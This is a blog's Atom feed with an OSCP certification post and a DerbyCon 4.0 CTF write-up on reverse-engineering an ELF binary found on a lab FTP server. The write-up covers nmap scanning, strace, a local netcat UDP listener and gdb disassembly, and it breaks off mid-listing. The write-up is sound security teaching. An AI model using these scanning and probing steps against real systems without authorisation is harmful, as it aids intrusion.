<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Chiggins Thoughts]]></title>
  <link href="http://chigstuff.com/atom.xml" rel="self"/>
  <link href="http://chigstuff.com/"/>
  <updated>2015-04-28T14:09:05-05:00</updated>
  <id>http://chigstuff.com/</id>
  <author>
    <name><![CDATA[Chris Higgins]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Hey, I Did the OSCP!]]></title>
    <link href="http://chigstuff.com/blog/2015/04/28/hey-i-did-the-oscp/"/>
    <updated>2015-04-28T00:05:39-05:00</updated>
    <id>http://chigstuff.com/blog/2015/04/28/hey-i-did-the-oscp</id>
    <content type="html"><![CDATA[<p>So over the past handful of months I&rsquo;ve been taking some time and worked on the <a href="https://www.offensive-security.com/information-security-training/penetration-testing-with-kali-linux/">Penetration Testing with Kali Linux</a> training, which in turn I took the <a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/">Offensive Security Certified Professional</a> exam! It took a while for me to be able to work through all the training, but as of April 27th, 2015, I am OSCP certified!</p>

<!-- more -->


<h2>The Training</h2>

<p>Towards the end of last summer I was able to start the training course, and had two months of lab time. I really recommend spending the first handful of days to go over the reading and video materials. They will really help you out when you&rsquo;re going through the lab and you&rsquo;ll know where to reference stuff at.</p>

<p>When you start your first couple nmap scans on the lab network, don&rsquo;t get overwhelmed at the number of machines you find and the total amount of information. Take as many notes as you can, I ended up using Evernote for my notes since that will sync across all the devices I used. Keeping great notes will only help you in the long run.</p>

<p>In terms of the lab machines, there really is a wide range of machines across various difficulty levels. There are a handful of boxes that will seem pretty easy to exploit, but then there are a good number that will leave you banging your head against a wall. If you get too stuck, the Offensive Security forums and the #offsec IRC channel are both great resources.</p>

<p>I was able to get a lot of the exercises and training done in my first two months, but with the combination of work, the training, and more school work than I anticipated, I ran out of time before I finished what I wanted to and felt comfortable with. I ended up taking a bit of time off from the training and cleaned up a lot of my notes so I would be more prepared for my last attempt at the lab. This March I purchased 15 more days which would overlap with my spring break and spent every day working on the labs, attempting to get as many machines as I could. I learned a lot over the training and finally scheduled a time for my exam.</p>

<h2>The Exam</h2>

<p>My exam was scheduled to start at noon on Friday, April 24th. I got everything as prepared as I could, had my training lab report and exercise report all straightened out, and was damn near ready to go. Once I got my exam instructions I was going to town. There were times I knew I was doing well, there were times I was super frustrated, and some times where I needed to take a step back and do something to take my mind off the challenges like make dinner or do some dishes. I ended up getting enough points to pass after about twelve hours into the exam, so I figured that was a good point to get some sleep. I woke up early the next day but didn&rsquo;t score any more points. I spent a few hours putting together my exam report and I was done way earlier than I thought I&rsquo;d be. I submitted all of my documentation and awaited a pass/fail email!</p>

<p>When I woke up to get ready for work Monday morning, first thing I saw on my phone (minus an annoying alarm clock) was an email from Offensive Security saying that I passed and had obtained my OSCP! I was beyond ecstatic to say the least!</p>

<h2>The Conclusion</h2>

<p>Even though I took longer than I would&rsquo;ve liked on the training and lab environment, I felt like it was well worth it. I learned a whole lot, and one of my favorite things about the lab environment is how much it felt like a real corporation. I honestly feel like I became one with the <strong>THINC.local</strong> domain and learned a bunch from it.</p>

<p>Now I want to spend some time looking into more exploit development and malware analysis while also focusing on finishing up my masters degree. Hell, maybe I&rsquo;ll even be able to go after the OSCE soon! Thanks to Offensive Security for the training and certification and the staff for all the help!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DerbyCon 4.0 CTF - TRNDOCS ELF Binary Reverse Engineering and Debugging]]></title>
    <link href="http://chigstuff.com/blog/2014/09/30/derbycon-4-dot-0-ctf-trndocs-elf-binary-reverse-engineering-and-debugging/"/>
    <updated>2014-09-30T14:19:46-05:00</updated>
    <id>http://chigstuff.com/blog/2014/09/30/derbycon-4-dot-0-ctf-trndocs-elf-binary-reverse-engineering-and-debugging</id>
    <content type="html"><![CDATA[<p>So this past weekend I attended DerbyCon 4.0 in Louisville, Kentucky, and was lucky enough to play the CTF along side the <a href="https://twitter.com/bsjtf">@bsjtf</a> team. We were able to place 16th out of the 77 point scoring teams/individuals, which is pretty damn good I&rsquo;d say. This write-up will be for a reversing challenge I solved, adding 450 points to the teams total.</p>

<!--more-->


<p>One of the first things done was a scan for various services on the network. Since FTP is a common place for CTF flags to hide, went searching for any FTP servers in the environment.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap 10.10.146.1/24 -p 21 --open -sV</span></code></pre></td></tr></table></div></figure>


<p>One of the FTP servers that stood out was 10.10.146.74 which has anonymous read access and quite an interesting MOTD when logging in.</p>

<blockquote><p>230-This is a temporary ftp server, while we finish our migration off DOS<br/>230-platforms.  For now transaction documents are still availible at<br/>230-/DRIVE_C/TRNDOCS but these are already being generated by the LINUX<br/>230-backend.  <br/>230-<br/>230-DOCS for DCs that have already been upgraded are ciphered with<br/>230-OpenSSL, the utility to obtain the shared password from your<br/>230-credentials is TRNDOCS directory. <br/>230-Use the serer xxx.xxx.xxx.xxx to authenticate, you can manually<br/>230-inspect a TRN document with OpenSSL once you obtain the key. <br/>230-<br/>230-openssl des3 -d -salt -in <file> -k <shared password><br/>230-<br/>230 User logged in</p></blockquote>


<p>Interesting, /DRIVE_C/TRNDOCS/ seems to have a lot of interesting information in it. So I pull everything down and start analyzing the file in there.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[chiggins@vader ~/DerbyCon4.0/74/DRIVE_C/TRNDOCS]$ ls
</span><span class='line'>ATL  CLE  HBG  PGET_A.OUT  RIC
</span><span class='line'>[chiggins@vader ~/DerbyCon4.0/74/DRIVE_C/TRNDOCS]$ file PGET_A.OUT 
</span><span class='line'>PGET_A.OUT: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 3.2.29, not stripped
</span><span class='line'>[chiggins@vader ~/DerbyCon4.0/74/DRIVE_C/TRNDOCS]$ cd ATL
</span><span class='line'>[chiggins@vader ~/DerbyCon4.0/74/DRIVE_C/TRNDOCS/ATL]$ file *
</span><span class='line'>10.TRN: data
</span><span class='line'>11.TRN: data
</span><span class='line'>12.TRN: data
</span><span class='line'>13.TRN: data
</span><span class='line'>14.TRN: data
</span><span class='line'>15.TRN: data
</span><span class='line'>1.TRN:  data
</span><span class='line'>2.TRN:  data
</span><span class='line'>3.TRN:  data
</span><span class='line'>4.TRN:  data
</span><span class='line'>5.TRN:  data
</span><span class='line'>6.TRN:  data
</span><span class='line'>7.TRN:  data
</span><span class='line'>8.TRN:  data
</span><span class='line'>9.TRN:  data
</span><span class='line'>[chiggins@vader ~/DerbyCon4.0/74/DRIVE_C/TRNDOCS/ATL]$ cd ..
</span><span class='line'>[chiggins@vader ~/DerbyCon4.0/74/DRIVE_C/TRNDOCS]$ cd CLE
</span><span class='line'>[chiggins@vader ~/DerbyCon4.0/74/DRIVE_C/TRNDOCS/CLE]$ file *
</span><span class='line'>10.TRN: ASCII text
</span><span class='line'>11.TRN: ASCII text
</span><span class='line'>12.TRN: ASCII text
</span><span class='line'>13.TRN: ASCII text
</span><span class='line'>14.TRN: ASCII text
</span><span class='line'>15.TRN: ASCII text
</span><span class='line'>1.TRN:  ASCII text
</span><span class='line'>2.TRN:  ASCII text
</span><span class='line'>3.TRN:  ASCII text
</span><span class='line'>4.TRN:  ASCII text
</span><span class='line'>5.TRN:  ASCII text
</span><span class='line'>6.TRN:  ASCII text
</span><span class='line'>7.TRN:  ASCII text
</span><span class='line'>8.TRN:  ASCII text
</span><span class='line'>9.TRN:  ASCII text
</span><span class='line'>[chiggins@vader ~/DerbyCon4.0/74/DRIVE_C/TRNDOCS/CLE]$ cat 1.TRN
</span><span class='line'>invoice: 21815
</span><span class='line'>order: 8925
</span><span class='line'>customer: 30871
</span><span class='line'>scrip: Percocet
</span><span class='line'>days: 14
</span><span class='line'>addr1: James Monroe
</span><span class='line'>addr2: 6596 Euclid
</span><span class='line'>addr3; Zanesville PA 22112</span></code></pre></td></tr></table></div></figure>


<p>So it looks like we have a combination of plaintext data, encrypted data, and an ELF binary, which is very interesting. Running strings on the binary doesn&rsquo;t show anything of super interest. Lets just run it and see what happens.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[chiggins@vader ~/DerbyCon4.0/74/DRIVE_C/TRNDOCS]$ ./PGET_A.OUT 
</span><span class='line'>Must set options -s (server) -p (password) and -u (username).
</span><span class='line'>[chiggins@vader ~/DerbyCon4.0/74/DRIVE_C/TRNDOCS]$ ./PGET_A.OUT -s 127.0.0.1 -p password -u user`</span></code></pre></td></tr></table></div></figure>


<p>The program accepts a server (which I assume it wants to talk to), and a username and password to validate against. Running it with my localhost set as the server just lets it hang, so I&rsquo;m assuming a socket is being created somewhere. Using strace we&rsquo;ll be able to see more about this.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[chiggins@vader ~/DerbyCon4.0/74/DRIVE_C/TRNDOCS]$ strace ./PGET_A.OUT -s 127.0.0.1 -p password -u user 
</span><span class='line'>execve("./PGET_A.OUT", ["./PGET_A.OUT", "-s", "127.0.0.1", "-p", "password", "-u", "user"], [/* 44 vars */]) = 0
</span><span class='line'>[ Process PID=10312 runs in 32 bit mode. ]
</span><span class='line'>uname({sys="Linux", node="vader", ...}) = 0
</span><span class='line'>brk(0)                                  = 0x9f55000
</span><span class='line'>brk(0x9f55d40)                          = 0x9f55d40
</span><span class='line'>set_thread_area({entry_number:-1, base_addr:0x9f55840, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 (entry_number:12)
</span><span class='line'>brk(0x9f76d40)                          = 0x9f76d40
</span><span class='line'>brk(0x9f77000)                          = 0x9f77000
</span><span class='line'>socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP) = 4
</span><span class='line'>sendto(4, "user password", 13, 0, {sa_family=AF_INET, sin_port=htons(3000), sin_addr=inet_addr("127.0.0.1")}, 16) = 13
</span><span class='line'>recvfrom(4, 
</span><span class='line'>)</span></code></pre></td></tr></table></div></figure>


<p>I was right, a socket is trying to make a connection and read back some data. If you notice in sendto, the socket is trying to send data &ldquo;user password&rdquo; to 127.0.0.1 on port 3000. I figured that this program was meant to talk to a server on the network, but scanning for an open port 3000 turned out no results. Figured to just keep moving on with this binary and see what else it does.</p>

<p>So I decided to set up a natcat listener on port 3000 and try to receive the data and send data back. One thing that tripped me up with this is that I didn&rsquo;t realize you needed to tell netcat to listen as a UDP port. Before knowing that, whenever I had my netcat listener running on TCP 3000, the program would not connect to it. After finding out how to specify UDP, I was finally able to send data back and forth.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#### netcat listener ####
</span><span class='line'>[chiggins@vader ~]$ nc -ulvvp 3000 
</span><span class='line'>Listening on any address 3000 (hbci)
</span><span class='line'>Received packet from 127.0.0.1:58075 -> 127.0.0.1:3000 (local)
</span><span class='line'>user passwordJUNKDATA
</span><span class='line'>
</span><span class='line'>#### program ####
</span><span class='line'>[chiggins@vader ~/DerbyCon4.0/74/DRIVE_C/TRNDOCS]$ ./PGET_A.OUT -s 127.0.0.1 -p password -u user 
</span><span class='line'>bad username or password
</span><span class='line'>
</span><span class='line'>#### program with strace ####
</span><span class='line'>[chiggins@vader ~/DerbyCon4.0/74/DRIVE_C/TRNDOCS]$ strace ./PGET_A.OUT -s 127.0.0.1 -p password -u user
</span><span class='line'>execve("./PGET_A.OUT", ["./PGET_A.OUT", "-s", "127.0.0.1", "-p", "password", "-u", "user"], [/* 44 vars */]) = 0
</span><span class='line'>[ Process PID=10537 runs in 32 bit mode. ]
</span><span class='line'>uname({sys="Linux", node="vader", ...}) = 0
</span><span class='line'>brk(0)                                  = 0x9388000
</span><span class='line'>brk(0x9388d40)                          = 0x9388d40
</span><span class='line'>set_thread_area({entry_number:-1, base_addr:0x9388840, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 (entry_number:12)
</span><span class='line'>brk(0x93a9d40)                          = 0x93a9d40
</span><span class='line'>brk(0x93aa000)                          = 0x93aa000
</span><span class='line'>socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP) = 4
</span><span class='line'>sendto(4, "user password", 13, 0, {sa_family=AF_INET, sin_port=htons(3000), sin_addr=inet_addr("127.0.0.1")}, 16) = 13
</span><span class='line'>recvfrom(4, "JUNKDA", 6, 0, {sa_family=AF_INET, sin_port=htons(3000), sin_addr=inet_addr("127.0.0.1")}, [16]) = 6
</span><span class='line'>fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
</span><span class='line'>mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffffffff7722000
</span><span class='line'>write(1, "bad username or password\n", 25bad username or password
</span><span class='line'>) = 25
</span><span class='line'>exit_group(0)                           = ?
</span><span class='line'>+++ exited with 0 +++</span></code></pre></td></tr></table></div></figure>


<p>So there&rsquo;s a bit going on here. The netcat listener gets set up to listen on port 3000 with the -u specifing UDP. Then when the program runs, it sends along the specified arguments &ldquo;user password&rdquo;. I send back &ldquo;JUNKDATA&rdquo; and the program fails saying bad username and password. I also included the strace output, and you&rsquo;ll notice that the program only reads 6 bytes, &ldquo;JUNKDA&rdquo;.</p>

<p>Here is where we start to do some debugging and reversing. I load up the program in gdb, set the required arguments, and take a look at the main method.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[chiggins@vader ~/DerbyCon4.0/74/DRIVE_C/TRNDOCS]$ gdb -q ./PGET_A.OUT
</span><span class='line'>Reading symbols from ./PGET_A.OUT...done.
</span><span class='line'>gdb>set args -s 127.0.0.1 -u username -p password
</span><span class='line'>gdb>disassemble main
</span><span class='line'>Dump of assembler code for function main:
</span><span class='line'>   0x08048c85 &lt;+0>:    push   ebp
</span><span class='line'>   0x08048c86 &lt;+1>:    mov    ebp,esp
</span><span class='line'>   0x08048c88 &lt;+3>:    push   edi
</span><span class='line'>   0x08048c89 &lt;+4>:    push   esi
</span><span class='line'>   0x08048c8a &lt;+5>:    push   ebx
</span><span class='line'>   0x08048c8b &lt;+6>:    and    esp,0xfffffff0
</span><span class='line'>   0x08048c8e &lt;+9>:    sub    esp,0x50
</span><span class='line'>   0x08048c91 &lt;+12>:   mov    DWORD PTR [esp+0x4c],0x0
</span><span class='line'>   0x08048c99 &lt;+20>:   mov    DWORD PTR [esp+0x48],0x0
</span><span class='line'>   0x08048ca1 &lt;+28>:   mov    DWORD PTR [esp+0x44],0x0
</span><span class='line'>   0x08048ca9 &lt;+36>:   lea    eax,[esp+0x13]
</span><span class='line'>   0x08048cad &lt;+40>:   mov    edx,0x80bac20
</span><span class='line'>   0x08048cb2 &lt;+45>:   mov    ebx,0x25
</span><span class='line'>   0x08048cb7 &lt;+50>:   mov    ecx,eax
</span><span class='line'>   0x08048cb9 &lt;+52>:   and    ecx,0x1
</span><span class='line'>   0x08048cbc &lt;+55>:   test   ecx,ecx
</span><span class='line'>   0x08048cbe &lt;+57>:   je     0x8048cc7 &lt;main+66>
</span><span class='line'>   0x08048cc0 &lt;+59>:   mov    cl,BYTE PTR [edx]
</span><span class='line'>   0x08048cc2 &lt;+61>:   mov    BYTE PTR [eax],cl
</span><span class='line'>   0x08048cc4 &lt;+63>:   inc    eax
</span><span class='line'>   0x08048cc5 &lt;+64>:   inc    edx
</span><span class='line'>   0x08048cc6 &lt;+65>:   dec    ebx
</span><span class='line'>   0x08048cc7 &lt;+66>:   mov    ecx,eax
</span><span class='line'>   0x08048cc9 &lt;+68>:   and    ecx,0x2
</span><span class='line'>   0x08048ccc &lt;+71>:   test   ecx,ecx
</span><span class='line'>   0x08048cce &lt;+73>:   je     0x8048cdf &lt;main+90>
</span><span class='line'>   0x08048cd0 &lt;+75>:   mov    cx,WORD PTR [edx]
</span><span class='line'>   0x08048cd3 &lt;+78>:   mov    WORD PTR [eax],cx
</span><span class='line'>   0x08048cd6 &lt;+81>:   add    eax,0x2
</span><span class='line'>   0x08048cd9 &lt;+84>:   add    edx,0x2
</span><span class='line'>   0x08048cdc &lt;+87>:   sub    ebx,0x2
</span><span class='line'>   0x08048cdf &lt;+90>:   mov    ecx,ebx
</span><span class='line'>   0x08048ce1 &lt;+92>:   shr    ecx,0x2
</span><span class='line'>   0x08048ce4 &lt;+95>:   mov    edi,eax
</span><span class='line'>   0x08048ce6 &lt;+97>:   mov    esi,edx
</span><span class='line'>   0x08048ce8 &lt;+99>:   rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
</span><span class='line'>   0x08048cea &lt;+101>:  mov    edx,esi
</span><span class='line'>   0x08048cec &lt;+103>:  mov    eax,edi
</span><span class='line'>   0x08048cee &lt;+105>:  mov    ecx,0x0
</span><span class='line'>   0x08048cf3 &lt;+110>:  mov    esi,ebx
</span><span class='line'>   0x08048cf5 &lt;+112>:  and    esi,0x2
</span><span class='line'>   0x08048cf8 &lt;+115>:  test   esi,esi
</span><span class='line'>   0x08048cfa &lt;+117>:  je     0x8048d07 &lt;main+130>
</span><span class='line'>   0x08048cfc &lt;+119>:  mov    si,WORD PTR [edx+ecx*1]
</span><span class='line'>   0x08048d00 &lt;+123>:  mov    WORD PTR [eax+ecx*1],si
</span><span class='line'>   0x08048d04 &lt;+127>:  add    ecx,0x2
</span><span class='line'>   0x08048d07 &lt;+130>:  and    ebx,0x1
</span><span class='line'>   0x08048d0a &lt;+133>:  test   ebx,ebx
</span><span class='line'>   0x08048d0c &lt;+135>:  je     0x8048d14 &lt;main+143>
</span><span class='line'>   0x08048d0e &lt;+137>:  mov    dl,BYTE PTR [edx+ecx*1]
</span><span class='line'>   0x08048d11 &lt;+140>:  mov    BYTE PTR [eax+ecx*1],dl
</span><span class='line'>   0x08048d14 &lt;+143>:  mov    DWORD PTR ds:0x80e4a18,0x0
</span><span class='line'>   0x08048d1e &lt;+153>:  jmp    0x8048d75 &lt;main+240>
</span><span class='line'>   0x08048d20 &lt;+155>:  cmp    DWORD PTR [esp+0x3c],0x75
</span><span class='line'>   0x08048d25 &lt;+160>:  jne    0x8048d32 &lt;main+173>
</span><span class='line'>   0x08048d27 &lt;+162>:  mov    eax,ds:0x80e6218
</span><span class='line'>   0x08048d2c &lt;+167>:  mov    DWORD PTR [esp+0x4c],eax
</span><span class='line'>   0x08048d30 &lt;+171>:  jmp    0x8048d75 &lt;main+240>
</span><span class='line'>   0x08048d32 &lt;+173>:  cmp    DWORD PTR [esp+0x3c],0x70
</span><span class='line'>   0x08048d37 &lt;+178>:  jne    0x8048d44 &lt;main+191>
</span><span class='line'>   0x08048d39 &lt;+180>:  mov    eax,ds:0x80e6218
</span><span class='line'>   0x08048d3e &lt;+185>:  mov    DWORD PTR [esp+0x48],eax
</span><span class='line'>   0x08048d42 &lt;+189>:  jmp    0x8048d75 &lt;main+240>
</span><span class='line'>   0x08048d44 &lt;+191>:  cmp    DWORD PTR [esp+0x3c],0x73
</span><span class='line'>   0x08048d49 &lt;+196>:  jne    0x8048d56 &lt;main+209>
</span><span class='line'>   0x08048d4b &lt;+198>:  mov    eax,ds:0x80e6218
</span><span class='line'>   0x08048d50 &lt;+203>:  mov    DWORD PTR [esp+0x44],eax
</span><span class='line'>   0x08048d54 &lt;+207>:  jmp    0x8048d75 &lt;main+240>
</span><span class='line'>   0x08048d56 &lt;+209>:  mov    edx,DWORD PTR ds:0x80e4a14
</span><span class='line'>   0x08048d5c &lt;+215>:  mov    eax,ds:0x80e453c
</span><span class='line'>   0x08048d61 &lt;+220>:  mov    DWORD PTR [esp+0x8],edx
</span><span class='line'>   0x08048d65 &lt;+224>:  mov    DWORD PTR [esp+0x4],0x80bab4e
</span><span class='line'>   0x08048d6d &lt;+232>:  mov    DWORD PTR [esp],eax
</span><span class='line'>   0x08048d70 &lt;+235>:  call   0x80498a0 &lt;fprintf>
</span><span class='line'>   0x08048d75 &lt;+240>:  mov    DWORD PTR [esp+0x8],0x80bab62
</span><span class='line'>   0x08048d7d &lt;+248>:  mov    eax,DWORD PTR [ebp+0xc]
</span><span class='line'>   0x08048d80 &lt;+251>:  mov    DWORD PTR [esp+0x4],eax
</span><span class='line'>   0x08048d84 &lt;+255>:  mov    eax,DWORD PTR [ebp+0x8]
</span><span class='line'>   0x08048d87 &lt;+258>:  mov    DWORD PTR [esp],eax
</span><span class='line'>   0x08048d8a &lt;+261>:  call   0x8055b10 &lt;getopt>
</span><span class='line'>   0x08048d8f &lt;+266>:  mov    DWORD PTR [esp+0x3c],eax
</span><span class='line'>   0x08048d93 &lt;+270>:  cmp    DWORD PTR [esp+0x3c],0xffffffff
</span><span class='line'>   0x08048d98 &lt;+275>:  jne    0x8048d20 &lt;main+155>
</span><span class='line'>   0x08048d9a &lt;+277>:  cmp    DWORD PTR [esp+0x4c],0x0
</span><span class='line'>   0x08048d9f &lt;+282>:  je     0x8048daf &lt;main+298>
</span><span class='line'>   0x08048da1 &lt;+284>:  cmp    DWORD PTR [esp+0x48],0x0
</span><span class='line'>   0x08048da6 &lt;+289>:  je     0x8048daf &lt;main+298>
</span><span class='line'>   0x08048da8 &lt;+291>:  cmp    DWORD PTR [esp+0x44],0x0
</span><span class='line'>   0x08048dad &lt;+296>:  jne    0x8048dde &lt;main+345>
</span><span class='line'>   0x08048daf &lt;+298>:  mov    eax,ds:0x80e453c
</span><span class='line'>   0x08048db4 &lt;+303>:  mov    DWORD PTR [esp+0xc],eax
</span><span class='line'>   0x08048db8 &lt;+307>:  mov    DWORD PTR [esp+0x8],0x3e
</span><span class='line'>   0x08048dc0 &lt;+315>:  mov    DWORD PTR [esp+0x4],0x1
</span><span class='line'>   0x08048dc8 &lt;+323>:  mov    DWORD PTR [esp],0x80bab6c
</span><span class='line'>   0x08048dcf &lt;+330>:  call   0x8049900 &lt;fwrite>
</span><span class='line'>   0x08048dd4 &lt;+335>:  mov    eax,0x1
</span><span class='line'>   0x08048dd9 &lt;+340>:  jmp    0x8048eed &lt;main+616>
